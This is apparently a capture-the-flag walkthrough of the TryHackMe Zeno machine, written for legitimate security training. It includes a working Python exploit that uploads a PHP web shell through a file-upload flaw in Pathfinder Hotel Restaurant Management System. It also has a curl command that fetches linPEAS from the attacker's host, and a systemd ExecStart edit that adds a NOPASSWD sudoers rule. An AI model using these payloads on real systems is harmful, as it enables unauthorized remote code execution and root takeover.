> In this walkthrough, we compromise the TryHackMe **Zeno** machine by enumerating an exposed web service, discovering a **Pathfinder Hotel Restaurant Management System** instance, and exploiting a known **file upload vulnerability** to gain remote code execution as the `apache` user. We then leverage **exposed credentials identified with linPEAS** to pivot into the `edward` account, and finally escalate privileges to root by abusing a **writable systemd service combined with sudo reboot permissions**, achieving full system compromise.

---

## Shell as apache

A quick search for:

```
Pathfinder Hotel Restaurant Management System exploits
```

Leads us to a PoC on Exploit-DB:  
[https://www.exploit-db.com/exploits/47520](https://www.exploit-db.com/exploits/47520)

After downloading the script and fixing it a bit, the final version looks like this:

```python

   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                             | |
                                             |_|
""")

if len(sys.argv) != 2:
    print("[+] Usage: python3 exploit.py http://target/")
    sys.exit()

url = sys.argv[1].rstrip("/") + "/"
target = url + "admin/foods-exec.php"

print("[+] Target:", target)

# Better payload (more flexible than shell_exec)
php_payload = '<?php system($_GET["cmd"]); ?>'

files = {
    "photo": ("shell.php", php_payload, "application/x-php")
}

data = {
    "Submit": "Add"
}

headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": url + "admin/foods.php"
}

try:
    r = requests.post(
        target,
        files=files,
        data=data,
        headers=headers,
        verify=False,
        timeout=15
    )

    print("[+] Request sent")

    # common upload paths (depends on app structure)
    print("[+] Try:")
    print(url + "images/shell.php?cmd=id")
    print(url + "img/shell.php?cmd=id")

except Exception as e:
    print("[-] Error:", str(e))
```

## Shell as edward

While enumerating the system, I noticed a user named `edward` in `/home`, but I didn’t have permission to list its contents.

At this point, it’s time to bring in the usual helper—`linpeas`.

I downloaded it from:  
[https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

Since downloading directly on the victim machine wasn’t possible, I grabbed it locally on my machine and served it using a simple HTTP server:

```shell
python3 -m http.server 80
```
{: .nolineno }

Then, on the victim machine, since `wget` wasn’t available, I used `curl`:

```shell
curl <YOUR_IP>/linpeas.sh -o linpeas.sh
```
{: .nolineno }

After that:

```shell
chmod +x linpeas.sh && ./linpeas.sh
```

### Analyzing the Service

Let’s check the service file:

![](cat_zeno_monitoring_service.png){: width="800" height="400" .shadow }

Since we have write permissions on this file, we can modify it.

Now the `sudo reboot` permission starts to make sense:

- When the system reboots, `systemd` will restart services
    
- The `ExecStart` directive will be executed
    
- And it runs as **root**
    

So if we modify `ExecStart`, we can execute commands as root on startup.

---

### Exploitation

Open the service file:

```shell
vi /etc/systemd/system/zeno-monitoring.service
```
{: .nolineno }

Replace the `ExecStart` line with:

```text
ExecStart=/bin/sh -c 'echo "edward ALL=(root) NOPASSWD: ALL" >> /etc/sudoers'
```

![](vi_edit_zone_monitoring_service.png){: width="800" height="400" .shadow }

Save the file, then reboot the system:

```shell
[edward@zeno shm]$ sudo /usr/sbin/reboot 
```
{: .nolineno }

### Privilege Escalation

Wait a minute for the machine to come back online, then log in again as `edward`.

Check privileges:

```shell
sudo -l
```
{: .nolineno }

You should now see:

```shell
(root) NOPASSWD: ALL
```
{: .nolineno }

Now simply run:

```shell
sudo su
```
{: .nolineno }

And just like that—you’ve got a root shell:
